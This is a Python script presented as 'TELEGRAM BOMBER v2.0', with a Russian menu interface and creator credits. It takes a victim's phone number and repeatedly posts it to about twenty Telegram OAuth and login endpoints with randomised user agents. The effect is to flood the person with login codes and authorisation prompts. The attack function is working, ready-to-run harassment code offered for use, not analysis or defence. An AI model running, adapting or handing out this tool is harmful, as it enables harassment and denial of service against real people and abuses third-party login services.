from termcolor import colored
import threading
from fake_useragent import UserAgent
import requests
import os
import time
import sys
import random

stop_attack = False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animate_text(text, color='white', delay=0.03, effect='type'):
    """Анимированный вывод текста с различными эффектами"""
    if effect == 'type':
        for char in text:
            print(colored(char, color), end='', flush=True)
            time.sleep(delay)
        print()
    elif effect == 'fade':
        for i in range(len(text) + 1):
            clear_line()
            print(colored(text[:i], color), end='', flush=True)
            time.sleep(delay)
        print()
    elif effect == 'glitch':
        glitch_chars = "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
        for i in range(len(text) + 1):
            clear_line()
            displayed = text[:i]
            if i < len(text):
                glitch = ''.join(random.choice(glitch_chars) for _ in range(3))
                print(colored(displayed + glitch, color), end='\r', flush=True)
                time.sleep(0.1)
            print(colored(displayed, color), end='', flush=True)
            time.sleep(delay)
        print()
    elif effect == 'rainbow':
        colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
        for i, char in enumerate(text):
            color_idx = i % len(colors)
            print(colored(char, colors[color_idx]), end='', flush=True)
            time.sleep(delay)
        print()

def clear_line():
    sys.stdout.write('\033[2K\033[1G')
    sys.stdout.flush()

def loading_animation(text="Загрузка", duration=2):
    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    end_time = time.time() + duration
    
    print(colored(text, 'yellow'), end=' ', flush=True)
    
    while time.time() < end_time:
        for frame in frames:
            if time.time() >= end_time:
                break
            print(colored(frame, 'cyan'), end='\r', flush=True)
            time.sleep(0.1)
    
    clear_line()

def show_banner():
    clear_screen()
    banner = r'''
    ╔═══╗╔╗──╔╗╔═══╗╔════╗╔═══╗╔═══╗╔╗──╔╗╔════╗╔═══╗╔═══╗
    ║╔══╝║║──║║║╔══╝║╔╗╔╗║║╔══╝║╔═╗║║║──║║║╔╗╔╗║║╔══╝║╔═╗║
    ║╚══╗║║──║║║╚══╗╚╝║║╚╝║╚══╗║╚═╝║║║──║║╚╝║║╚╝║╚══╗║╚═╝║
    ║╔══╝║║──║║║╔══╝──║║──║╔══╝║╔╗╔╝║║──║║──║║──║╔══╝║╔╗╔╝
    ║║───║╚══╝║║╚══╗──║║──║╚══╗║║║╚╗║╚══╝║──║║──║╚══╗║║║╚╗
    ╚╝───╚════╝╚═══╝──╚╝──╚═══╝╚╝╚═╝╚════╝──╚╝──╚═══╝╚╝╚═╝
    '''
    
    animate_text(banner, 'red', 0.001, 'fade')
    
    subtitle = "💣 TELEGRAM BOMBER v2.0 💣"
    animate_text(subtitle, 'yellow', 0.05, 'rainbow')
    
    print()

def attack(phone_number):
    global stop_attack
    try:
        for _ in range(127):
            if stop_attack:
                break
            
            user = UserAgent().random
            headers = {'user-agent': user}
            
            endpoints = [
                ('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', {'phone': phone_number}),
                ('https://translations.telegram.org/auth/request', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', {'phone': phone_number}),
                ('https://translations.telegram.org/auth/request', {'phone': phone_number}),
                ('https://translations.telegram.org/auth/request', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', {'phone': phone_number}),
                ('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', {'phone': phone_number}),
                ('https://my.telegram.org/auth/send_password', {'phone': phone_number})
            ]

            for url, data in endpoints:
                if stop_attack:
                    break
                try:
                    response = requests.post(url, headers=headers, data=data, timeout=5)
                    print(colored(f"[+] Запрос к {url.split('?')[0]} отправлен (Статус: {response.status_code})", 'green'))
                except Exception as e:
                    print(colored(f"[!] Ошибка при запросе к {url.split('?')[0]}: {str(e)[:50]}", 'red'))

    except Exception as e:
        print(colored(f"[!!!] Критическая ошибка: {e}", 'red'))

def show_creator():
    clear_screen()
    
    animate_text("╔══════════════════════════════╗", 'magenta', 0.01)
    animate_text("║       О СОЗДАТЕЛЕ            ║", 'magenta', 0.01)
    animate_text("╠══════════════════════════════╣", 'magenta', 0.01)
    animate_text("║                              ║", 'magenta', 0.01)
    animate_text("║ Создатель: @Evoledam         ║", 'cyan', 0.03, 'glitch')
    animate_text("║                              ║", 'magenta', 0.01)
    animate_text("║ Telegram: t.me/Evoledam      ║", 'blue', 0.02)
    animate_text("║ GitHub: github.com/Evoledam  ║", 'blue', 0.01)
    animate_text("║                              ║", 'magenta', 0.01)
    animate_text("║ Версия: 2.0                  ║", 'green', 0.02)
    animate_text("║                              ║", 'magenta', 0.01)
    animate_text("╚══════════════════════════════╝", 'magenta', 0.01)
    
    input(colored("\nНажмите Enter чтобы вернуться...", 'yellow'))

def show_menu():
    clear_screen()
    show_banner()
    
    animate_text("═"*40, 'cyan', 0.01)
    animate_text("1. Запустить бомбер", 'yellow', 0.03)
    animate_text("2. Выключить бомбер", 'yellow', 0.03)
    animate_text("3. О создателе", 'yellow', 0.03)
    animate_text("═"*40, 'cyan', 0.01)
    
    return input(colored("\nВыберите опцию (1-3): ", 'magenta'))

def start_attack_animation(number):
    """Анимация начала атаки"""
    clear_screen()
    
    animate_text("🚀 ПОДГОТОВКА К АТАКЕ", 'red', 0.05, 'glitch')
    print()
    
    animate_text(f"🎯 ЦЕЛЬ: {number}", 'yellow', 0.03)
    loading_animation("Инициализация", 1)
    
    animate_text("🔧 НАСТРОЙКА ПАРАМЕТРОВ", 'cyan', 0.03)
    loading_animation("Конфигурация", 1)
    
    animate_text("⚡ ЗАПУСК АТАКИ", 'green', 0.05, 'rainbow')
    print()

def complaint():
    global stop_attack
    
    while True:
        choice = show_menu()
        
        if choice == '1':
            clear_screen()
            number = input(colored("\nВведите номер телефона (+7...): ", 'red'))
            if not number.startswith('+'):
                number = '+7' + number.lstrip('7').lstrip('8')
            
            start_attack_animation(number)
            
            stop_attack = False
            try:
                attack_thread = threading.Thread(target=attack, args=(number,))
                attack_thread.daemon = True
                attack_thread.start()
                
                # Анимация во время атаки
                frames = ["💣", "🔥", "⚡", "💥"]
                frame_idx = 0
                
                while attack_thread.is_alive():
                    print(colored(f"\r{frames[frame_idx]} Атака в процессе... Остановить: Ctrl+C", 'red'), end='', flush=True)
                    frame_idx = (frame_idx + 1) % len(frames)
                    time.sleep(0.5)
                    attack_thread.join(0.1)
                    
            except KeyboardInterrupt:
                stop_attack = True
                print(colored("\n\n🛑 АТАКА ОСТАНОВЛЕНА!", 'red'))
            finally:
                input(colored("\nНажмите Enter чтобы продолжить...", 'yellow'))
            
        elif choice == '2':
            animate_text("\n🔄 Завершение работы...", 'red', 0.03, 'fade')
            stop_attack = True
            time.sleep(1)
            break
            
        elif choice == '3':
            show_creator()
            
        else:
            animate_text("\n❌ Неверный выбор, попробуйте снова", 'red', 0.03)
            time.sleep(1)

if __name__ == "__main__":
    try:
        complaint()
    except KeyboardInterrupt:
        animate_text("\n\n👋 До свидания!", 'green', 0.05, 'rainbow')